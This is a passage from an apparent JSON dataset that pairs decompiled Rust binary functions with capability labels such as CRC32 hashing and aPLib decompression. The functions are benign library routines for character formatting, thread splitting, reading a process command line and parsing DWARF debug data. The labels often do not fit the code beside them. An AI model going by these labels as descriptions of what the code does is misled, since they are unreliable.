        "decompiled_code": "\nulong sym.core::fmt::Write::write_char::h798c18942437231d(int64_t **arg1, ulong arg2)\n\n{\n    int64_t *arg1_00;\n    uchar uVar1;\n    int64_t arg2_00;\n    uint64_t arg3;\n    uint32_t uStack28;\n    \n    // core::fmt::Write::write_char::h798c18942437231d\n    uVar1 = arg2;\n    if (arg2 < 0x80) {\n        uStack28 = arg2 & 0xff;\n        arg3 = 1;\n    }\n    else if (arg2 < 0x800) {\n        uStack28 = (CONCAT11(uVar1, arg2 >> 6) | 0xc0) & 0xffff3fff | 0x8000;\n        arg3 = 2;\n    }\n    else if (arg2 < 0x10000) {\n        uStack28 = (CONCAT12(uVar1, CONCAT11(arg2 >> 6, arg2 >> 0xc)) & 0xff3fff | 0x80e0) & 0xff3fffff | 0x800000;\n        arg3 = 3;\n    }\n    else {\n        uStack28 = CONCAT13(uVar1, CONCAT12(arg2 >> 6, CONCAT11(arg2 >> 0xc, arg2 >> 0x12))) & 0x3f3f3f07 | 0x808080f0;\n        arg3 = 4;\n    }\n    arg1_00 = *arg1;\n    arg2_00 = arg1_00[2];\n    if (arg1_00[1] - arg2_00 < arg3) {\n        dbg.do_reserve_and_handle<u8, alloc::alloc::Global>(arg1_00, arg2_00, arg3);\n        arg2_00 = arg1_00[2];\n    }\n    sym.memcpy(*arg1_00 + arg2_00, &uStack28, arg3);\n    arg1_00[2] = arg2_00 + arg3;\n    return 0;\n}\n",
        "token_count": 473
    },
    "ce2093dd": {
        "rules": [
            "hash data with CRC32/a4d5eed7afd042fc93e3f1fa27687e43",
            "decompress data using aPLib/068152e73b06436aa790bef7a99b301a"
        ],
        "decompiled_code": "\nulong sym.rayon::iter::plumbing::LengthSplitter::try_split::hce2093dd0020a5d0(uint64_t *arg1, uint64_t arg2)\n\n{\n    uint64_t uVar1;\n    uint64_t uVar2;\n    ulong uVar3;\n    uint64_t uVar4;\n    char in_R8B;\n    \n    // rayon::iter::plumbing::LengthSplitter::try_split::hce2093dd0020a5d0\n    if (arg2 >> 1 < arg1[1]) {\ncode_r0x0043cb63:\n        uVar3 = 0;\n    }\n    else {\n        uVar1 = *arg1;\n        if (in_R8B == '\\0') {\n            if (uVar1 == 0) goto code_r0x0043cb63;\n            uVar4 = uVar1 >> 1;\n        }\n        else {\n            uVar2 = sym.rayon_core::current_num_threads::h8673cef0ca165181();\n            uVar4 = uVar1 >> 1;\n            if (uVar1 >> 1 < uVar2) {\n                uVar4 = uVar2;\n            }\n        }\n        *arg1 = uVar4;\n        uVar3 = 1;\n    }\n    return uVar3;\n}\n",
        "token_count": 296
    },
    "0cdb1e17": {
        "rules": [
            "hash data with CRC32/a4d5eed7afd042fc93e3f1fa27687e43",
            "decompress data using aPLib/068152e73b06436aa790bef7a99b301a"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid sym.sysinfo::windows::process::get_cmd_line_new::h0cdb1e171d284a87(ulong *arg1, ulong ProcessHandle)\n\n{\n    int32_t iVar1;\n    uint32_t uStack92;\n    int64_t iStack88;\n    ulong uStack80;\n    ulong uStack72;\n    uint32_t uStack60;\n    uint uStack56;\n    uint uStack52;\n    uint uStack48;\n    uint uStack44;\n    \n    // sysinfo::windows::process::get_cmd_line_new::h0cdb1e171d284a87\n    uStack80 = 0x3c;\n    iVar1 = sub.ntdll.dll_NtQueryInformationProcess(ProcessHandle, 0x3c, 0, 0, &uStack92);\n    if (((iVar1 == -0x7ffffffb) || (iVar1 == -0x3fffffdd)) || (iVar1 == -0x3ffffffc)) {\n        uStack60 = uStack92;\n        uStack72 = uStack92 >> 1;\n        iStack88 = sym.alloc::raw_vec::RawVec_T_A_::allocate_in::hcea65d7f5250fa5a(uStack72 + 1);\n        iVar1 = sub.ntdll.dll_NtQueryInformationProcess(ProcessHandle, 0x3c, iStack88, uStack92, &uStack60);\n        if (iVar1 < 0) {\n            sym._alloc::raw_vec::RawVec_T_A__as_core::ops::drop::Drop_::drop::h9f68a4721a6a073d(&iStack88);\n        }\n        else {\n            sym.alloc::vec::Vec_T_A_::push::h3822946f157e7ae8(&iStack88, 0);\n            uStack56 = uStack80;\n            uStack52 = uStack80._4_4_;\n            uStack48 = uStack72;\n            uStack44 = uStack72._4_4_;\n            if (iStack88 != 0) {\n                sym.sysinfo::windows::process::get_cmdline_from_buffer::h67a97f119be38dff(arg1, *(iStack88 + 8));\n                sym._alloc::raw_vec::RawVec_T_A__as_core::ops::drop::Drop_::drop::h9f68a4721a6a073d(&iStack88);\n                return;\n            }\n        }\n    }\n    *arg1 = 8;\n    *(arg1 + 1) = ZEXT816(0);\n    return;\n}\n",
        "token_count": 572
    },
    "7cbf9c79": {
        "rules": [
            "hash data using murmur3/51beaa2d5a2f415db2ae4fc8ef819b72/938ec34b87fc49598ca2362852471498"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n\nvoid sym.gimli::read::unit::parse_attribute::h7cbf9c79cddacd7d\n               (ulong *arg1, uint32_t **arg2, uint64_t arg3, uint32_t *arg4)\n\n{\n    uint8_t uVar1;\n    char cVar2;\n    uchar uVar3;\n    uint32_t **ppuVar4;\n    uint32_t *puVar5;\n    ulong uVar6;\n    uint64_t uVar7;\n    char cVar8;\n    uint32_t uVar9;\n    int32_t iVar10;\n    uint32_t *puVar11;\n    uint8_t *puVar12;\n    uint32_t uVar13;\n    uint32_t **unaff_RBP;\n    int64_t iVar14;\n    uint64_t uVar15;\n    uint16_t in_stack_00000028;\n    uint16_t in_stack_00000030;\n    int64_t iStack88;\n    uint32_t *puStack80;\n    uint32_t **ppuStack72;\n    ulong var_1h;\n    \n    // gimli::read::unit::parse_attribute::h7cbf9c79cddacd7d\n    cVar2 = arg3 >> 8;\n    uVar15 = (arg3 & 0xffffffff) >> 0x10;\n    uVar7 = in_stack_00000030;\ncode_r0x0042a1c9:\n    uVar9 = uVar7 - 1;\n    if (0x2b < uVar9) goto code_r0x0042a278;\n    // switch table (44 cases) at 0x42b398\n    switch(uVar9 & 0xffff) {\n    case 0:\n        uVar15 = 0x17;\n        uVar9 = arg3 - 1;\n        ppuStack72 = uVar9;\n        uVar1 = uVar9;\n        if (7 < uVar1) goto code_r0x0042b341;\n        ppuStack72 = uVar1;\n        unaff_RBP = *(ppuStack72 * 4 + 0x42b4cc) + 0x42b4cc;\n    // switch table (8 cases) at 0x42b4cc\n        switch(unaff_RBP) {\n        case 0x42a3dc:\n            ppuStack72 = *arg2;\n            if (arg2[1] != NULL) {\n                *arg2 = ppuStack72 + 1;\n                arg2[1] = arg2[1] + -1;\n                arg4 = *ppuStack72;\n                uVar15 = 0;\n                uVar1 = 0;\n                break;\n            }\ncode_r0x0042b2d5:\n            uVar15 = 0x13;\n            arg3 = 0;\n        case 0x42b341:\ncode_r0x0042b341:\n            arg1[1] = (arg3 & 0xff) << 8 | uVar15;\n            goto code_r0x0042afec;\n        case 0x42b25b:\n            ppuStack72 = *arg2;\n            if (arg2[1] < 0x2) goto code_r0x0042b2d5;\n            *arg2 = ppuStack72 + 2;\n            arg2[1] = arg2[1] + -2;\n            arg4 = *ppuStack72;\n            uVar1 = *ppuStack72 >> 8;\n            uVar15 = 0;\n            break;\n        case 0x42b28c:\n            ppuStack72 = *arg2;\n            if (arg2[1] < 0x4) goto code_r0x0042b2d5;\n            *arg2 = ppuStack72 + 4;\n            arg2[1] = arg2[1] + -1;\n            uVar9 = *ppuStack72;\n            arg4 = uVar9;\n            uVar1 = uVar9 >> 8;\n            uVar15 = uVar9 & 0xffff0000;\n            break;\n        case 0x42b2c2:\n            ppuStack72 = *arg2;\n            if (arg2[1] < 0x8) goto code_r0x0042b2d5;\n            *arg2 = ppuStack72 + 1;\n            arg2[1] = arg2[1] + -2;\n            arg4 = *ppuStack72;\n            uVar1 = arg4 >> 8;\n            uVar15 = arg4 & 0xffffffffffff0000;\n        }\n        uVar13 = uVar1;\n        uVar9 = uVar15 >> 0x10 & 0xffff;\n        uVar15 = uVar15 & 0xffffffff00000000;\n        uVar6 = 0;\n        goto code_r0x0042b073;\n    case 1:\n        goto code_r0x0042adc8;\n    case 2:\n        puVar11 = *arg2;\n        if (0x1 < arg2[1]) {\n            arg4 = puVar11 + 2;\n            ppuVar4 = arg2[1] + -2;\n            *arg2 = arg4;\n            arg2[1] = ppuVar4;\n            unaff_RBP = *puVar11;\ncode_r0x0042a5db:\n            puVar11 = arg4;\n            if (ppuVar4 < unaff_RBP) goto code_r0x0042a9f7;\n            *arg2 = arg4 + unaff_RBP;\n            arg2[1] = ppuVar4 - unaff_RBP;\n            goto code_r0x0042a5f1;\n        }\n        goto code_r0x0042a9f7;\n    case 3:\n        puVar11 = *arg2;\n        if (0x3 < arg2[1]) {\n            arg4 = puVar11 + 1;\n            ppuVar4 = arg2[1] + -1;\n            *arg2 = arg4;\n            arg2[1] = ppuVar4;\n            unaff_RBP = *puVar11;\n            goto code_r0x0042a5db;\n        }\n        goto code_r0x0042a9f7;\n    case 4:\n        ppuStack72 = *arg2;\n        if (arg2[1] < 0x2) {\n            cVar8 = '\\x13';\n            arg4 = NULL;\n        }\n        else {\n            *arg2 = ppuStack72 + 2;\n            arg2[1] = arg2[1] + -2;\n            arg4 = *ppuStack72;\n            cVar8 = 'G';\n        }\n        if (cVar8 != 'G') {\ncode_r0x0042b0e1:\n            *(arg1 + 1) = cVar8;\n            *(arg1 + 0xf) = 0;\n            *(arg1 + 0xd) = 0;\n            *(arg1 + 9) = 0;\n            goto code_r0x0042afec;\n        }\n        uVar13 = arg4 >> 8;\n        uVar6 = 3;\n        break;\n    case 5:\n        if ((cVar2 == '\\x04') &&\n           (cVar2 = sym.gimli::read::unit::allow_section_offset::h276a1b04766ed811(in_stack_00000028, uVar15), \n           cVar2 != '\\0')) {\n            ppuStack72 = *arg2;\n            if (arg2[1] < 0x4) goto code_r0x0042afe4;\n            *arg2 = ppuStack72 + 4;\n            arg2[1] = arg2[1] + -1;\n            arg4 = *ppuStack72;\n            uVar6 = 10;\n        }\n        else {\n            ppuStack72 = *arg2;\n            if (arg2[1] < 0x4) {\n                cVar8 = '\\x13';\n                arg4 = NULL;\n            }\n            else {\n                *arg2 = ppuStack72 + 4;\n                arg2[1] = arg2[1] + -1;\n                arg4 = *ppuStack72;\n                cVar8 = 'G';\n            }\n            uVar6 = 4;\n            if (cVar8 != 'G') goto code_r0x0042b0e1;\n        }\n        uVar9 = arg4 >> 0x10;\n        uVar13 = arg4 >> 8 & 0xff;\n        goto code_r0x0042b071;\n    case 6:\n        if ((cVar2 == '\\b') &&\n           (cVar2 = sym.gimli::read::unit::allow_section_offset::h276a1b04766ed811(in_stack_00000028, uVar15), \n           cVar2 != '\\0')) {\n            ppuStack72 = *arg2;\n            puVar11 = arg2[1];\n            uVar6 = 10;\n        }\n        else {\n            ppuStack72 = *arg2;\n            puVar11 = arg2[1];\n            uVar6 = 5;\n        }\n        if (puVar11 < 0x8) goto code_r0x0042afe4;\n        unaff_RBP = ppuStack72 + 1;\n        *arg2 = unaff_RBP;\n        arg2[1] = puVar11 + -2;\n        arg4 = *ppuStack72;\n        uVar15 = arg4 & 0xffffffff00000000;\n        uVar9 = arg4 >> 0x10 & 0xffff;\n        uVar13 = arg4 >> 8 & 0xff;\n        goto code_r0x0042b073;\n    case 7:\n        arg4 = *arg2;\n        ppuVar4 = arg2[1];\n        puVar11 = arg4;\n        if (ppuVar4 == NULL) goto code_r0x0042a536;\n        unaff_RBP = NULL;\n        goto code_r0x0042a520;\n    case 8:\n        arg4 = *arg2;\n        puVar11 = arg2[1];\n        puVar5 = NULL;\n        iVar14 = -1;\n        iVar10 = 0;\n        unaff_RBP = NULL;\n        goto code_r0x0042a585;\n    case 9:\n        puVar11 = *arg2;\n        if (arg2[1] != NULL) {\n            arg4 = puVar11 + 1;\n            ppuVar4 = arg2[1] + -1;\n            *arg2 = arg4;\n            arg2[1] = ppuVar4;\n            unaff_RBP = *puVar11;\n            goto code_r0x0042a5db;\n        }\n        goto code_r0x0042a9f7;\n    case 10:\n        ppuStack72 = *arg2;\n        if (arg2[1] == NULL) {\n            cVar8 = '\\x13';\n            arg4 = NULL;\n        }\n        else {\n            *arg2 = ppuStack72 + 1;\n            arg2[1] = arg2[1] + -1;\n            arg4 = *ppuStack72;\n            cVar8 = 'G';\n        }\n        if (cVar8 != 'G') goto code_r0x0042b0e1;\n        uVar6 = 2;\n        goto code_r0x0042b06d;\n    case 0xb:\n        ppuStack72 = *arg2;\n        if (arg2[1] == NULL) {\n            cVar8 = '\\x13';\n            cVar2 = '\\0';\n        }\n        else {\n            *arg2 = ppuStack72 + 1;\n            arg2[1] = arg2[1] + -1;\n            cVar2 = *ppuStack72;\n            cVar8 = 'G';\n        }\n        if (cVar8 != 'G') goto code_r0x0042b0e1;\n        arg4 = cVar2 != '\\0';\n        uVar6 = 9;\n        goto code_r0x0042b06d;\n    case 0xc:\n        ppuStack72 = *arg2;\n        puVar11 = arg2[1];\n        unaff_RBP = ppuStack72 + 1;\n        iVar10 = 0;\n        uVar15 = 0;\n        goto code_r0x0042a6b2;\n    case 0xd:\n        if (cVar2 == '\\b') {\n            ppuStack72 = *arg2;\n            if (arg2[1] < 0x8) goto code_r0x0042afe4;\n            *arg2 = ppuStack72 + 1;\n            arg2[1] = arg2[1] + -2;\n            arg4 = *ppuStack72;\n        }\n        else {\n            ppuStack72 = *arg2;\n            if (arg2[1] < 0x4) goto code_r0x0042afe4;\n            *arg2 = ppuStack72 + 4;\n            arg2[1] = arg2[1] + -1;\n            arg4 = *ppuStack72;\n        }\n        uVar13 = arg4 >> 8 & 0xff;\n        uVar9 = arg4 >> 0x10 & 0xffff;\n        uVar15 = arg4 & 0xffffffff00000000;\n        uVar6 = 0x1a;\n        goto code_r0x0042b073;\n    case 0xe:\n        ppuStack72 = *arg2;\n        puVar11 = arg2[1];\n        unaff_RBP = ppuStack72 + 1;\n        iVar10 = 0;\n        arg4 = NULL;\n        goto code_r0x0042a759;\n    case 0xf:\n        if ((arg3 & 0xffffffff) >> 0x10 == 2) {\n            dbg.read_sized_offset<gimli::read::endian_slice::EndianSlice<gimli::endianity::LittleEndian>>\n                      (&iStack88, arg2, arg3, in_stack_00000030);\n        }\n        else {\n            sym.gimli::read::reader::Reader::read_offset::h97608af453b2dc45(&iStack88, arg2);\n        }\n        if (iStack88 != 0) {\n            arg1[1] = puStack80;\n            goto code_r0x0042afec;\n        }\n        uVar13 = puStack80 >> 8;\n        uVar9 = puStack80 >> 0x10 & 0xffff;\n        uVar15 = puStack80 & 0xffffffff00000000;\n        uVar6 = 0xe;\n        arg4 = puStack80;\n        goto code_r0x0042b073;\n    case 0x10:\n        ppuStack72 = *arg2;\n        if (arg2[1] != NULL) {\n            *arg2 = ppuStack72 + 1;\n            arg2[1] = arg2[1] + -1;\n            arg4 = *ppuStack72;\n            uVar6 = 0xd;\n            goto code_r0x0042b06d;\n        }\n        goto code_r0x0042afe4;\n    case 0x11:\n        ppuStack72 = *arg2;\n        if (arg2[1] < 0x2) goto code_r0x0042afe4;\n        *arg2 = ppuStack72 + 2;\n        arg2[1] = arg2[1] + -2;\n        arg4 = *ppuStack72;\n        uVar13 = *ppuStack72 >> 8;\n        uVar6 = 0xd;\n        break;\n    case 0x12:\n        ppuStack72 = *arg2;\n        if (0x3 < arg2[1]) {\n            *arg2 = ppuStack72 + 4;\n            arg2[1] = arg2[1] + -1;\n            uVar9 = *ppuStack72;\n            arg4 = uVar9;\n            uVar13 = uVar9 >> 8 & 0xff;\n            uVar9 = uVar9 >> 0x10;\n            uVar6 = 0xd;\n            goto code_r0x0042b071;\n        }\n        goto code_r0x0042afe4;\n    case 0x13:\n        ppuStack72 = *arg2;\n        if (arg2[1] < 0x8) goto code_r0x0042afe4;\n        *arg2 = ppuStack72 + 1;\n        arg2[1] = arg2[1] + -2;\n        arg4 = *ppuStack72;\n        goto code_r0x0042a862;\n    case 0x14:\n        ppuStack72 = *arg2;\n        puVar11 = arg2[1];\n        unaff_RBP = ppuStack72 + 1;\n        iVar10 = 0;\n        arg4 = NULL;\n        goto code_r0x0042a8c5;\n    case 0x15:\n        puVar11 = *arg2;\n        puVar5 = arg2[1];\n        if (puVar5 != NULL) goto code_r0x0042a1f4;\n        uVar3 = 0x13;\n        goto code_r0x0042b320;\n    case 0x16:\n        if (cVar2 == '\\b') {\n            ppuStack72 = *arg2;\n            if (arg2[1] < 0x8) goto code_r0x0042afe4;\n            *arg2 = ppuStack72 + 1;\n            arg2[1] = arg2[1] + -2;\n            arg4 = *ppuStack72;\n        }\n        else {\n            ppuStack72 = *arg2;\n            if (arg2[1] < 0x4) goto code_r0x0042afe4;\n            *arg2 = ppuStack72 + 4;\n            arg2[1] = arg2[1] + -1;\n            arg4 = *ppuStack72;\n        }\n        uVar13 = arg4 >> 8 & 0xff;\n        uVar9 = arg4 >> 0x10 & 0xffff;\n        uVar15 = arg4 & 0xffffffff00000000;\n        uVar6 = 10;\n        goto code_r0x0042b073;\n    case 0x17:\n        arg4 = *arg2;\n        puVar11 = arg2[1];\n        puVar5 = NULL;\n        iVar14 = -1;\n        iVar10 = 0;\n        unaff_RBP = NULL;\n        goto code_r0x0042a965;\n    case 0x18:\n        uVar6 = 9;\n        uVar13 = 0;\n        arg4 = 0x1;\n        break;\n    case 0x19:\n        goto code_r0x0042a312;\n    case 0x1a:\n        goto code_r0x0042a29b;\n    case 0x1b:\n        ppuStack72 = *arg2;\n        if (0x3 < arg2[1]) {\n            *arg2 = ppuStack72 + 4;\n            arg2[1] = arg2[1] + -1;\n            uVar9 = *ppuStack72;\n            arg4 = uVar9;\n            uVar13 = uVar9 >> 8 & 0xff;\n            uVar9 = uVar9 >> 0x10;\n            uVar6 = 0xf;\n            goto code_r0x0042b071;\n        }\n        goto code_r0x0042afe4;\n    case 0x1c:\n        goto code_r0x0042a382;\n    case 0x1d:\n        arg4 = *arg2;\n        puVar11 = arg4;\n        if (0xf < arg2[1]) {\n            *arg2 = arg4 + 4;\n            arg2[1] = arg2[1] + -4;\n            uVar13 = arg4 >> 8 & 0xff;\n            uVar9 = arg4 >> 0x10 & 0xffff;\n            uVar15 = arg4 & 0xffffffff00000000;\n            uVar6 = 1;\n            unaff_RBP = 0x10;\n            goto code_r0x0042b073;\n        }\ncode_r0x0042a9f7:\n        arg1[1] = 0x13;\n        arg1[2] = puVar11;\n        goto code_r0x0042aff0;\n    case 0x1e:\n        if (cVar2 == '\\b') {\n            ppuStack72 = *arg2;\n            if (arg2[1] < 0x8) goto code_r0x0042afe4;\n            *arg2 = ppuStack72 + 1;\n            arg2[1] = arg2[1] + -2;\n            arg4 = *ppuStack72;\n        }\n        else {\n            ppuStack72 = *arg2;\n            if (arg2[1] < 0x4) goto code_r0x0042afe4;\n            *arg2 = ppuStack72 + 4;\n            arg2[1] = arg2[1] + -1;\n            arg4 = *ppuStack72;\n        }\n        uVar13 = arg4 >> 8 & 0xff;\n        uVar9 = arg4 >> 0x10 & 0xffff;\n        uVar15 = arg4 & 0xffffffff00000000;\n        uVar6 = 0x1e;\n        goto code_r0x0042b073;\n    case 0x1f:\n        ppuStack72 = *arg2;\n        if (arg2[1] < 0x8) goto code_r0x0042afe4;\n        *arg2 = ppuStack72 + 1;\n        arg2[1] = arg2[1] + -2;\n        arg4 = *ppuStack72;\n        uVar13 = arg4 >> 8 & 0xff;\n        uVar9 = arg4 >> 0x10 & 0xffff;\n        uVar15 = arg4 & 0xffffffff00000000;\n        uVar6 = 0x19;\n        goto code_r0x0042b073;\n    case 0x20:\n        if (in_stack_00000030 == 0x21) {\n            uVar13 = arg4 >> 8 & 0xff;\n            uVar9 = arg4 >> 0x10 & 0xffff;\n            uVar15 = arg4 & 0xffffffff00000000;\n            uVar6 = 6;\n            goto code_r0x0042b073;\n        }\n        arg1[1] = 0x46;\n        goto code_r0x0042aff0;\n    case 0x21:\n        ppuStack72 = *arg2;\n        puVar11 = arg2[1];\n        unaff_RBP = ppuStack72 + 1;\n        iVar10 = 0;\n        arg4 = NULL;\n        goto code_r0x0042aac9;\n    case 0x22:\n        ppuStack72 = *arg2;\n        puVar11 = arg2[1];\n        unaff_RBP = ppuStack72 + 1;\n        iVar10 = 0;\n        arg4 = NULL;\n        goto code_r0x0042ab39;\n    case 0x23:\n        goto code_r0x0042acb5;\n    case 0x24:\n        ppuStack72 = *arg2;\n        if (arg2[1] != NULL) {\n            *arg2 = ppuStack72 + 1;\n            arg2[1] = arg2[1] + -1;\n            arg4 = *ppuStack72;\n            uVar6 = 0x1d;\n            goto code_r0x0042b06d;\n        }\n        goto code_r0x0042afe4;\n    case 0x25:\n        ppuStack72 = *arg2;\n        if (arg2[1] < 0x2) goto code_r0x0042afe4;\n        *arg2 = ppuStack72 + 2;\n        arg2[1] = arg2[1] + -2;\n        arg4 = *ppuStack72;\n        uVar13 = *ppuStack72 >> 8;\n        uVar6 = 0x1d;\n        break;\n    case 0x26:\n        ppuStack72 = *arg2;\n        if (0x2 < arg2[1]) {\n            *arg2 = ppuStack72 + 3;\n            arg2[1] = arg2[1] + -3;\n            arg4 = *ppuStack72;\n            uVar9 = *ppuStack72;\n            uVar13 = *ppuStack72 >> 8;\n            goto code_r0x0042adb4;\n        }\n        goto code_r0x0042afe4;\n    case 0x27:\n        ppuStack72 = *arg2;\n        if (0x3 < arg2[1]) {\n            *arg2 = ppuStack72 + 4;\n            arg2[1] = arg2[1] + -1;\n            uVar9 = *ppuStack72;\n            arg4 = uVar9;\n            uVar13 = uVar9 >> 8 & 0xff;\ncode_r0x0042adb4:\n            uVar9 = uVar9 >> 0x10;\n            uVar6 = 0x1d;\n            goto code_r0x0042b071;\n        }\n        goto code_r0x0042afe4;\n    case 0x28:\n        ppuStack72 = *arg2;\n        if (arg2[1] == NULL) goto code_r0x0042afe4;\n        *arg2 = ppuStack72 + 1;\n        arg2[1] = arg2[1] + -1;\n        arg4 = *ppuStack72;\n        uVar6 = 0xc;\ncode_r0x0042b06d:\n        uVar13 = 0;\n        break;\n    case 0x29:\n        ppuStack72 = *arg2;\n        if (arg2[1] < 0x2) goto code_r0x0042afe4;\n        *arg2 = ppuStack72 + 2;\n        arg2[1] = arg2[1] + -2;\n        arg4 = *ppuStack72;\n        uVar13 = *ppuStack72 >> 8;\n        uVar6 = 0xc;\n        break;\n    case 0x2a:\n        ppuStack72 = *arg2;\n        if (0x2 < arg2[1]) {\n            *arg2 = ppuStack72 + 3;\n            arg2[1] = arg2[1] + -3;\n            arg4 = *ppuStack72;\n            uVar9 = *ppuStack72;\n            uVar13 = *ppuStack72 >> 8;\n            goto code_r0x0042ac9e;\n        }\n        goto code_r0x0042afe4;\n    case 0x2b:\n        ppuStack72 = *arg2;\n        if (0x3 < arg2[1]) {\n            *arg2 = ppuStack72 + 4;\n            arg2[1] = arg2[1] + -1;\n            uVar9 = *ppuStack72;\n            arg4 = uVar9;\n            uVar13 = uVar9 >> 8 & 0xff;\ncode_r0x0042ac9e:\n            uVar9 = uVar9 >> 0x10;\n            uVar6 = 0xc;\n            goto code_r0x0042b071;\n        }\n        goto code_r0x0042afe4;\n    }\n    uVar9 = 0;\ncode_r0x0042b071:\n    uVar15 = 0;\n    goto code_r0x0042b073;\ncode_r0x0042a278:\n    // switch table (33 cases) at 0x42b448\n    switch(uVar7 - 0x1f01U & 0xffff) {\n    case 0:\ncode_r0x0042a29b:\n        ppuStack72 = *arg2;\n        puVar11 = arg2[1];\n        unaff_RBP = ppuStack72 + 1;\n        iVar10 = 0;\n        arg4 = NULL;\n        do {\n            puVar11 = puVar11 + -1;\n            if (puVar11 == 0xffffffffffffffff) goto code_r0x0042ab60;\n            *arg2 = unaff_RBP;\n            arg2[1] = puVar11;\n            uVar1 = *(unaff_RBP + -1);\n            if ((iVar10 == 0x3f) && (1 < uVar1)) goto code_r0x0042ab59;\n            arg4 = arg4 | (uVar1 & 0x7f) << (iVar10 & 0x3f);\n            iVar10 = iVar10 + 7;\n            ppuStack72 = ppuStack72 + 1;\n            unaff_RBP = unaff_RBP + 1;\n        } while (uVar1 < '\\0');\n        uVar13 = arg4 >> 8 & 0xff;\n        uVar9 = arg4 >> 0x10 & 0xffff;\n        uVar15 = arg4 & 0xffffffff00000000;\n        uVar6 = 0xc;\n        break;\n    case 1:\ncode_r0x0042a312:\n        ppuStack72 = *arg2;\n        puVar11 = arg2[1];\n        unaff_RBP = ppuStack72 + 1;\n        iVar10 = 0;\n        arg4 = NULL;\n        do {\n            puVar11 = puVar11 + -1;\n            if (puVar11 == 0xffffffffffffffff) goto code_r0x0042ab60;\n            *arg2 = unaff_RBP;\n            arg2[1] = puVar11;\n            uVar1 = *(unaff_RBP + -1);\n            if ((iVar10 == 0x3f) && (1 < uVar1)) goto code_r0x0042ab59;\n            arg4 = arg4 | (uVar1 & 0x7f) << (iVar10 & 0x3f);\n            iVar10 = iVar10 + 7;\n            ppuStack72 = ppuStack72 + 1;\n            unaff_RBP = unaff_RBP + 1;\n        } while (uVar1 < '\\0');\n        uVar13 = arg4 >> 8 & 0xff;\n        uVar9 = arg4 >> 0x10 & 0xffff;\n        uVar15 = arg4 & 0xffffffff00000000;\n        uVar6 = 0x1d;\n        break;\n    default:\ncode_r0x0042adc8:\n        *(arg1 + 1) = 0xc;\n        goto code_r0x0042aff0;\n    case 0x1f:\n        if (cVar2 == '\\b') {\ncode_r0x0042acb5:\n            ppuStack72 = *arg2;\n            if (0x7 < arg2[1]) {\n                *arg2 = ppuStack72 + 1;\n                arg2[1] = arg2[1] + -2;\n                arg4 = *ppuStack72;\ncode_r0x0042b23c:\n                uVar13 = arg4 >> 8;\n                uVar9 = arg4 >> 0x10 & 0xffff;\n                uVar15 = arg4 & 0xffffffff00000000;\n                uVar6 = 0xf;\n                break;\n            }\n        }\n        else {\n            ppuStack72 = *arg2;\n            if (0x3 < arg2[1]) {\n                *arg2 = ppuStack72 + 4;\n                arg2[1] = arg2[1] + -1;\n                arg4 = *ppuStack72;\n                goto code_r0x0042b23c;\n            }\n        }\n        goto code_r0x0042afe4;\n    case 0x20:\ncode_r0x0042a382:\n        if (cVar2 == '\\b') {\n            ppuStack72 = *arg2;\n            if (0x7 < arg2[1]) {\n                *arg2 = ppuStack72 + 1;\n                arg2[1] = arg2[1] + -2;\n                arg4 = *ppuStack72;\ncode_r0x0042ad07:\n                uVar13 = arg4 >> 8 & 0xff;\n                uVar9 = arg4 >> 0x10 & 0xffff;\n                uVar15 = arg4 & 0xffffffff00000000;\n                uVar6 = 0x1b;\n                break;\n            }\n        }\n        else {\n            ppuStack72 = *arg2;\n            if (0x3 < arg2[1]) {\n                *arg2 = ppuStack72 + 4;\n                arg2[1] = arg2[1] + -1;\n                arg4 = *ppuStack72;\n                goto code_r0x0042ad07;\n            }\n        }\ncode_r0x0042afe4:\n        arg1[1] = 0x13;\n        goto code_r0x0042afec;\n    }\n    goto code_r0x0042b073;\n    while( true ) {\n        *arg2 = unaff_RBP;\n        arg2[1] = puVar11;\n        uVar1 = *(unaff_RBP + -1);\n        if ((iVar10 == 0x3f) && (1 < uVar1)) goto code_r0x0042ab59;\n        arg4 = arg4 | (uVar1 & 0x7f) << (iVar10 & 0x3f);\n        iVar10 = iVar10 + 7;\n        ppuStack72 = ppuStack72 + 1;\n        unaff_RBP = unaff_RBP + 1;\n        if (-1 < uVar1) break;\ncode_r0x0042ab39:\n        puVar11 = puVar11 + -1;\n        if (puVar11 == 0xffffffffffffffff) goto code_r0x0042ab60;\n    }\n    uVar13 = arg4 >> 8;\n    uVar9 = arg4 >> 0x10;\n    uVar15 = arg4 & 0xffffffff00000000;\n    uVar6 = 0x18;\n    goto code_r0x0042b073;\n    while( true ) {\n        *arg2 = unaff_RBP;\n        arg2[1] = puVar11;\n        uVar1 = *(unaff_RBP + -1);\n        if ((iVar10 == 0x3f) && (1 < uVar1)) goto code_r0x0042ab59;\n        arg4 = arg4 | (uVar1 & 0x7f) << (iVar10 & 0x3f);\n        iVar10 = iVar10 + 7;\n        ppuStack72 = ppuStack72 + 1;\n        unaff_RBP = unaff_RBP + 1;\n        if (-1 < uVar1) break;\ncode_r0x0042aac9:\n        puVar11 = puVar11 + -1;\n        if (puVar11 == 0xffffffffffffffff) goto code_r0x0042ab60;\n    }\n    uVar13 = arg4 >> 8;\n    uVar9 = arg4 >> 0x10 & 0xffff;\n    uVar15 = arg4 & 0xffffffff00000000;\n    uVar6 = 0x13;\n    goto code_r0x0042b073;\n    while( true ) {\n        *arg2 = arg4 + puVar5 + 1;\n        arg2[1] = puVar11 + iVar14;\n        uVar1 = *(arg4 + puVar5);\n        if ((iVar10 == 0x3f) && (1 < uVar1)) goto code_r0x0042a994;\n        unaff_RBP = unaff_RBP | (uVar1 & 0x7f) << (iVar10 & 0x3f);\n        iVar10 = iVar10 + 7;\n        puVar5 = puVar5 + 1;\n        iVar14 = iVar14 + -1;\n        if (-1 < uVar1) break;\ncode_r0x0042a965:\n        if (puVar11 == puVar5) goto code_r0x0042b1d0;\n    }\n    if (puVar11 - puVar5 < unaff_RBP) goto code_r0x0042b1d0;\n    *arg2 = puVar5 + unaff_RBP + arg4;\n    arg2[1] = puVar11 + (-puVar5 - unaff_RBP);\n    arg4 = arg4 + puVar5;\n    uVar13 = arg4 >> 8;\n    uVar9 = arg4 >> 0x10 & 0xffff;\n    uVar15 = arg4 & 0xffffffff00000000;\n    uVar6 = 8;\n    goto code_r0x0042b073;\ncode_r0x0042a1f4:\n    unaff_RBP = puVar5 + -1;\n    *arg2 = puVar11 + 1;\n    arg2[1] = unaff_RBP;\n    uVar9 = *puVar11 & 0x7f;\n    uVar7 = uVar9;\n    if (*puVar11 < '\\0') {\n        if (unaff_RBP == NULL) {\n            uVar3 = 0x13;\n            puVar11 = 